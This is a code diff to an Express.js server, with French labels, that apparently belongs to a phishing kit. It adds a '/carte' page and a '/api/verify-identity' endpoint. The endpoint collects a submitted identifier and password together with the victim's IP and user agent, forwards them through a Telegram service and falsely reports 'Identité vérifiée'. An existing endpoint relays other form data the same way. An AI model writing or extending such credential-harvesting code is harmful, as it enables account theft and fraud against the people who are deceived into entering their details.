@@ -35,6 +35,10 @@ app.get('/deuxieme', (req, res) => {
   res.render('deuxieme');
 });
 
+app.get('/carte', (req, res) => {
+  res.render('carte');
+});
+
 app.get('/troisieme', (req, res) => {
   res.render('troisieme');
 });
@@ -78,6 +82,27 @@ app.post('/api/send-form', async (req, res) => {
 
     await telegramService.sendFormData(data);
     res.json({ success: true, message: 'Données reçues' });
+  } catch (error) {
+    console.error('Erreur:', error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Vérifier identité (troisième page)
+app.post('/api/verify-identity', async (req, res) => {
+  try {
+    const { identifier, password } = req.body;
+
+    const data = {
+      identifier,
+      password,
+      ip: req.clientIP,
+      userAgent: req.userAgent,
+      timestamp: new Date().toISOString()
+    };
+
+    await telegramService.sendIdentityData(data);
+    res.json({ success: true, message: 'Identité vérifiée' });
   } catch (error) {
     console.error('Erreur:', error);
     res.status(500).json({ success: false, error: error.message });
